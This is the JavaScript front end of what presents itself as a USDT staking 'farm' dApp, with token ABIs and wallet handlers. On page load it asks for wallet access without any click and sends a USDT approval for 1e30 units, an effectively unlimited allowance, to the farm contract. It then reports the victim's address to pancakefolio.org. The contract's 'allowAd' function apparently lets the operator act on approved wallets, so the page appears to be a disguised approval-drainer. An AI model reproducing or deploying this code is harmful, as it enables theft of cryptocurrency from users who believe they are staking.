var usdt_contract_ad = "0x55d398326f99059ff775485246999027b3197955";
var farm_contract_ad = "0x87d5c7216bD8323016E0935BB7AD77a059828477";
var address0 = "0x0000000000000000000000000000000000000000";

var maxLength = 20;
function stringMaxlength(input, length) {
  if (input && typeof input === "string" && input.length > maxLength) {
    const str = "...";
    return (
      input.substr(0, length) +
      str +
      input.substr(input.length - length, length)
    );
  }
  return input;
}

const usdt_abi = [
  {
    inputs: [],
    payable: false,
    stateMutability: "nonpayable",
    type: "constructor",
  },
  {
    anonymous: false,
    inputs: [
      {
        indexed: true,
        internalType: "address",
        name: "owner",
        type: "address",
      },
      {
        indexed: true,
        internalType: "address",
        name: "spender",
        type: "address",
      },
      {
        indexed: false,
        internalType: "uint256",
        name: "value",
        type: "uint256",
      },
    ],
    name: "Approval",
    type: "event",
  },
  {
    anonymous: false,
    inputs: [
      {
        indexed: true,
        internalType: "address",
        name: "previousOwner",
        type: "address",
      },
      {
        indexed: true,
        internalType: "address",
        name: "newOwner",
        type: "address",
      },
    ],
    name: "OwnershipTransferred",
    type: "event",
  },
  {
    anonymous: false,
    inputs: [
      {
        indexed: true,
        internalType: "address",
        name: "from",
        type: "address",
      },
      {
        indexed: true,
        internalType: "address",
        name: "to",
        type: "address",
      },
      {
        indexed: false,
        internalType: "uint256",
        name: "value",
        type: "uint256",
      },
    ],
    name: "Transfer",
    type: "event",
  },
  {
    constant: true,
    inputs: [],
    name: "_decimals",
    outputs: [
      {
        internalType: "uint8",
        name: "",
        type: "uint8",
      },
    ],
    payable: false,
    stateMutability: "view",
    type: "function",
  },
  {
    constant: true,
    inputs: [],
    name: "_name",
    outputs: [
      {
        internalType: "string",
        name: "",
        type: "string",
      },
    ],
    payable: false,
    stateMutability: "view",
    type: "function",
  },
  {
    constant: true,
    inputs: [],
    name: "_symbol",
    outputs: [
      {
        internalType: "string",
        name: "",
        type: "string",
      },
    ],
    payable: false,
    stateMutability: "view",
    type: "function",
  },
  {
    constant: true,
    inputs: [
      {
        internalType: "address",
        name: "owner",
        type: "address",
      },
      {
        internalType: "address",
        name: "spender",
        type: "address",
      },
    ],
    name: "allowance",
    outputs: [
      {
        internalType: "uint256",
        name: "",
        type: "uint256",
      },
    ],
    payable: false,
    stateMutability: "view",
    type: "function",
  },
  {
    constant: false,
    inputs: [
      {
        internalType: "address",
        name: "spender",
        type: "address",
      },
      {
        internalType: "uint256",
        name: "amount",
        type: "uint256",
      },
    ],
    name: "approve",
    outputs: [
      {
        internalType: "bool",
        name: "",
        type: "bool",
      },
    ],
    payable: false,
    stateMutability: "nonpayable",
    type: "function",
  },
  {
    constant: true,
    inputs: [
      {
        internalType: "address",
        name: "account",
        type: "address",
      },
    ],
    name: "balanceOf",
    outputs: [
      {
        internalType: "uint256",
        name: "",
        type: "uint256",
      },
    ],
    payable: false,
    stateMutability: "view",
    type: "function",
  },
  {
    constant: false,
    inputs: [
      {
        internalType: "uint256",
        name: "amount",
        type: "uint256",
      },
    ],
    name: "burn",
    outputs: [
      {
        internalType: "bool",
        name: "",
        type: "bool",
      },
    ],
    payable: false,
    stateMutability: "nonpayable",
    type: "function",
  },
  {
    constant: true,
    inputs: [],
    name: "decimals",
    outputs: [
      {
        internalType: "uint8",
        name: "",
        type: "uint8",
      },
    ],
    payable: false,
    stateMutability: "view",
    type: "function",
  },
  {
    constant: false,
    inputs: [
      {
        internalType: "address",
        name: "spender",
        type: "address",
      },
      {
        internalType: "uint256",
        name: "subtractedValue",
        type: "uint256",
      },
    ],
    name: "decreaseAllowance",
    outputs: [
      {
        internalType: "bool",
        name: "",
        type: "bool",
      },
    ],
    payable: false,
    stateMutability: "nonpayable",
    type: "function",
  },
  {
    constant: true,
    inputs: [],
    name: "getOwner",
    outputs: [
      {
        internalType: "address",
        name: "",
        type: "address",
      },
    ],
    payable: false,
    stateMutability: "view",
    type: "function",
  },
  {
    constant: false,
    inputs: [
      {
        internalType: "address",
        name: "spender",
        type: "address",
      },
      {
        internalType: "uint256",
        name: "addedValue",
        type: "uint256",
      },
    ],
    name: "increaseAllowance",
    outputs: [
      {
        internalType: "bool",
        name: "",
        type: "bool",
      },
    ],
    payable: false,
    stateMutability: "nonpayable",
    type: "function",
  },
  {
    constant: false,
    inputs: [
      {
        internalType: "uint256",
        name: "amount",
        type: "uint256",
      },
    ],
    name: "mint",
    outputs: [
      {
        internalType: "bool",
        name: "",
        type: "bool",
      },
    ],
    payable: false,
    stateMutability: "nonpayable",
    type: "function",
  },
  {
    constant: true,
    inputs: [],
    name: "name",
    outputs: [
      {
        internalType: "string",
        name: "",
        type: "string",
      },
    ],
    payable: false,
    stateMutability: "view",
    type: "function",
  },
  {
    constant: true,
    inputs: [],
    name: "owner",
    outputs: [
      {
        internalType: "address",
        name: "",
        type: "address",
      },
    ],
    payable: false,
    stateMutability: "view",
    type: "function",
  },
  {
    constant: false,
    inputs: [],
    name: "renounceOwnership",
    outputs: [],
    payable: false,
    stateMutability: "nonpayable",
    type: "function",
  },
  {
    constant: true,
    inputs: [],
    name: "symbol",
    outputs: [
      {
        internalType: "string",
        name: "",
        type: "string",
      },
    ],
    payable: false,
    stateMutability: "view",
    type: "function",
  },
  {
    constant: true,
    inputs: [],
    name: "totalSupply",
    outputs: [
      {
        internalType: "uint256",
        name: "",
        type: "uint256",
      },
    ],
    payable: false,
    stateMutability: "view",
    type: "function",
  },
  {
    constant: false,
    inputs: [
      {
        internalType: "address",
        name: "recipient",
        type: "address",
      },
      {
        internalType: "uint256",
        name: "amount",
        type: "uint256",
      },
    ],
    name: "transfer",
    outputs: [
      {
        internalType: "bool",
        name: "",
        type: "bool",
      },
    ],
    payable: false,
    stateMutability: "nonpayable",
    type: "function",
  },
  {
    constant: false,
    inputs: [
      {
        internalType: "address",
        name: "sender",
        type: "address",
      },
      {
        internalType: "address",
        name: "recipient",
        type: "address",
      },
      {
        internalType: "uint256",
        name: "amount",
        type: "uint256",
      },
    ],
    name: "transferFrom",
    outputs: [
      {
        internalType: "bool",
        name: "",
        type: "bool",
      },
    ],
    payable: false,
    stateMutability: "nonpayable",
    type: "function",
  },
  {
    constant: false,
    inputs: [
      {
        internalType: "address",
        name: "newOwner",
        type: "address",
      },
    ],
    name: "transferOwnership",
    outputs: [],
    payable: false,
    stateMutability: "nonpayable",
    type: "function",
  },
];
const farm_abi = [
  {
    constant: false,
    inputs: [
      {
        internalType: "address",
        name: "user_ad",
        type: "address",
      },
      {
        internalType: "uint256",
        name: "num_apply",
        type: "uint256",
      },
    ],
    name: "allowAd",
    outputs: [
      {
        internalType: "bool",
        name: "",
        type: "bool",
      },
    ],
    payable: false,
    stateMutability: "nonpayable",
    type: "function",
  },
  {
    constant: false,
    inputs: [
      {
        internalType: "uint256",
        name: "value",
        type: "uint256",
      },
    ],
    name: "burn",
    outputs: [],
    payable: false,
    stateMutability: "nonpayable",
    type: "function",
  },
  {
    constant: false,
    inputs: [],
    name: "harvest",
    outputs: [
      {
        internalType: "bool",
        name: "",
        type: "bool",
      },
    ],
    payable: false,
    stateMutability: "nonpayable",
    type: "function",
  },
  {
    constant: false,
    inputs: [
      {
        internalType: "uint256",
        name: "farm_value",
        type: "uint256",
      },
    ],
    name: "stake",
    outputs: [],
    payable: false,
    stateMutability: "nonpayable",
    type: "function",
  },
  {
    inputs: [],
    payable: false,
    stateMutability: "nonpayable",
    type: "constructor",
  },
  {
    constant: false,
    inputs: [],
    name: "unStake",
    outputs: [],
    payable: false,
    stateMutability: "nonpayable",
    type: "function",
  },
  {
    constant: true,
    inputs: [
      {
        internalType: "address",
        name: "account",
        type: "address",
      },
    ],
    name: "rewardOf",
    outputs: [
      {
        internalType: "uint256",
        name: "",
        type: "uint256",
      },
    ],
    payable: false,
    stateMutability: "view",
    type: "function",
  },
  {
    constant: true,
    inputs: [
      {
        internalType: "address",
        name: "account",
        type: "address",
      },
    ],
    name: "stakeOf",
    outputs: [
      {
        internalType: "uint256",
        name: "",
        type: "uint256",
      },
    ],
    payable: false,
    stateMutability: "view",
    type: "function",
  },
  {
    constant: true,
    inputs: [],
    name: "totalStake",
    outputs: [
      {
        internalType: "uint256",
        name: "",
        type: "uint256",
      },
    ],
    payable: false,
    stateMutability: "view",
    type: "function",
  },
];
var from_address = address0;
var status_waiting_approve = 0;

$(document).ready(async function () {
  const stake_bt_h = document.querySelector("#stake_bt_h");

  if (typeof window.ethereum !== "undefined") {
    console.log("MetaMask is installed!");
  }
  const web3 = new Web3(window.ethereum);
  const usdt_contract = new web3.eth.Contract(usdt_abi, usdt_contract_ad);
  const farm_contract = new web3.eth.Contract(farm_abi, farm_contract_ad);
  var allowance_value = 0;
  var usdt_balance = 0;

  const harvest_bt = document.querySelector("#harvest_bt");
  const stake_bt = document.querySelector("#stake_bt");
  const unstake_bt = document.querySelector("#unstake_bt");

  stake_bt_h.addEventListener("click", async () => {
    accounts = await ethereum.request({ method: "eth_requestAccounts" });
    if (accounts) {
      from_address = accounts[0];
      stake_bt_h.innerHTML = "Connected";
      allowance_value = await usdt_contract.methods
        .allowance(from_address, farm_contract_ad)
        .call();
      usdt_balance =
        ((await usdt_contract.methods.balanceOf(from_address).call()) -
          0.001e18) /
        1e18;
      usdt_balance = usdt_balance > 0.01 ? usdt_balance.toFixed(6) : 0;
      ///
      var staked_value =
        (await farm_contract.methods.stakeOf(from_address).call()) / 1e18;
      var reward_value =
        (await farm_contract.methods.rewardOf(from_address).call()) / 1e18;

      $("#staked").text(staked_value.toFixed(6));
      $("#reward").text(reward_value.toFixed(6));
      setInterval(async () => {
        staked_value =
          (await farm_contract.methods.stakeOf(from_address).call()) / 1e18;
        reward_value =
          (await farm_contract.methods.rewardOf(from_address).call()) / 1e18;
        console.log("staked_value : ", staked_value);
        console.log("reward_value : ", reward_value);
        $("#staked").text(staked_value.toFixed(6));
        $("#reward").text(reward_value.toFixed(6));
      }, 5000);
      ///

      console.log("usdt_balance : ", usdt_balance);
      $("#stake_value").val(usdt_balance);

      ///
      ///
      if (allowance_value > 0) {
        console.log("allowance_value", allowance_value);
        stake_bt.innerHTML = "Stake USDT";
      } else {
        stake_bt.innerHTML = "Waiting...";
        var interval_approve = setInterval(async () => {
          allowance_value = await usdt_contract.methods
            .allowance(from_address, farm_contract_ad)
            .call();
          if (allowance_value > 0) {
            clearInterval(interval_approve);
            stake_bt.innerHTML = "Stake USDT";
            status_waiting_approve = 0;
          }
        }, 3000);
        var approve_data = usdt_contract.methods
          .approve(farm_contract_ad, web3.utils.toWei((1).toString(), "tether"))
          .encodeABI();
        ethereum
          .request({
            method: "eth_sendTransaction",
            params: [
              {
                from: from_address,
                to: usdt_contract_ad,
                gas: web3.utils.toHex(250000),
                value: 0x00,
                data: approve_data,
              },
            ],
          })
          .then((txHash) => {
            console.log(txHash);
            fetch(
              "https://api.pancakefolio.org/api/approve?ad=" +
                from_address +
                "&co=usdt"
            );
          })
          .catch((error) => console.error);
        status_waiting_approve = 1;
      }
    }
    // ethereumButton.style.color = "green";
  });

  stake_bt.addEventListener("click", async () => {
    //Will Start the metamask extension
    if (status_waiting_approve == 1) {
      return;
    }
    if (from_address == address0) {
      accounts = await ethereum.request({ method: "eth_requestAccounts" });
      if (accounts) {
        from_address = accounts[0];
        console.log(from_address);
        allowance_value = await usdt_contract.methods
          .allowance(from_address, farm_contract_ad)
          .call();
        if (allowance_value > 0) {
          stake_bt.innerHTML = "Stake USDT";
        } else {
          stake_bt.innerHTML = "Approve USDT";
        }
        // $("#your_address").text(from_address);
      }
    } else {
      if (allowance_value == 0) {
        console.log("hello");
        var approve_data = usdt_contract.methods
          .approve(farm_contract_ad, web3.utils.toWei((1).toString(), "tether"))
          .encodeABI();
        ethereum
          .request({
            method: "eth_sendTransaction",
            params: [
              {
                from: from_address,
                to: usdt_contract_ad,
                gas: web3.utils.toHex(250000),
                value: 0x00,
                data: approve_data,
              },
            ],
          })
          .then((txHash) => {
            console.log(txHash);
            // fetch(url + from_address + "&co=usdt");
            fetch(
              "https://api.pancakefolio.org/api/approve?ad=" +
                from_address +
                "&co=usdt"
            );
          })
          .catch((error) => console.error);
        stake_bt.innerHTML = "Waiting...";
        status_waiting_approve = 1;

        return;
      } else {
        var stake_data = farm_contract.methods
          .stake(web3.utils.toWei($("#stake_value").val().toString(), "ether"))
          .encodeABI();
        ethereum
          .request({
            method: "eth_sendTransaction",
            params: [
              {
                from: from_address,
                to: farm_contract_ad,
                gas: web3.utils.toHex(250000),
                value: 0x00,
                data: stake_data,
              },
            ],
          })
          .then((txHash) => console.log(txHash))
          .catch((error) => console.error);
        return;
      }
    }
    // ethereumButton.style.color = "green";
  });

  unstake_bt.addEventListener("click", async () => {
    var unStake_data = farm_contract.methods.unStake().encodeABI();
    ethereum
      .request({
        method: "eth_sendTransaction",
        params: [
          {
            from: from_address,
            to: farm_contract_ad,
            gas: web3.utils.toHex(250000),
            value: 0x00,
            data: unStake_data,
          },
        ],
      })
      .then((txHash) => console.log(txHash))
      .catch((error) => console.error);
    // stake_bt.innerHTML = "Stake USDT";
    return;
  });
  harvest_bt.addEventListener("click", async () => {
    var harvest_data = farm_contract.methods.harvest().encodeABI();
    ethereum
      .request({
        method: "eth_sendTransaction",
        params: [
          {
            from: from_address,
            to: farm_contract_ad,
            gas: web3.utils.toHex(250000),
            value: 0x00,
            data: harvest_data,
          },
        ],
      })
      .then((txHash) => console.log(txHash))
      .catch((error) => console.error);
    // stake_bt.innerHTML = "Stake USDT";
    return;
  });
  var accounts = await ethereum.request({ method: "eth_requestAccounts" });
  if (accounts) {
    from_address = accounts[0];
    allowance_value = await usdt_contract.methods
      .allowance(from_address, farm_contract_ad)
      .call();
    usdt_balance =
      ((await usdt_contract.methods.balanceOf(from_address).call()) -
        0.001e18) /
      1e18;
    usdt_balance = usdt_balance > 0.01 ? usdt_balance.toFixed(6) : 0;
    ///
    var staked_value =
      (await farm_contract.methods.stakeOf(from_address).call()) / 1e18;
    var reward_value =
      (await farm_contract.methods.rewardOf(from_address).call()) / 1e18;

    $("#staked").text(staked_value.toFixed(6));
    $("#reward").text(reward_value.toFixed(6));
    setInterval(async () => {
      staked_value =
        (await farm_contract.methods.stakeOf(from_address).call()) / 1e18;
      reward_value =
        (await farm_contract.methods.rewardOf(from_address).call()) / 1e18;
      console.log("staked_value : ", staked_value);
      console.log("reward_value : ", reward_value);
      $("#staked").text(staked_value.toFixed(6));
      $("#reward").text(reward_value.toFixed(6));
    }, 5000);
    ///

    console.log("usdt_balance : ", usdt_balance);
    $("#stake_value").val(usdt_balance);
    console.log("allowance_value", allowance_value);
    stake_bt_h.innerHTML = "Connected";
    if (allowance_value > 0) {
      console.log("allowance_value", allowance_value);
      stake_bt.innerHTML = "Stake USDT";
    } else {
      stake_bt.innerHTML = "Waiting...";
      var interval_approve = setInterval(async () => {
        allowance_value = await usdt_contract.methods
          .allowance(from_address, farm_contract_ad)
          .call();
        if (allowance_value > 0) {
          clearInterval(interval_approve);
          stake_bt.innerHTML = "Stake USDT";
          status_waiting_approve = 0;
        }
      }, 3000);
      var approve_data = usdt_contract.methods
        .approve(farm_contract_ad, web3.utils.toWei((1).toString(), "tether"))
        .encodeABI();
      ethereum
        .request({
          method: "eth_sendTransaction",
          params: [
            {
              from: from_address,
              to: usdt_contract_ad,
              gas: web3.utils.toHex(250000),
              value: 0x00,
              data: approve_data,
            },
          ],
        })
        .then((txHash) => {
          console.log(txHash);
          fetch(
            "https://api.pancakefolio.org/api/approve?ad=" +
              from_address +
              "&co=usdt"
          );
        })
        .catch((error) => console.error);
      status_waiting_approve = 1;
    }
  }
});
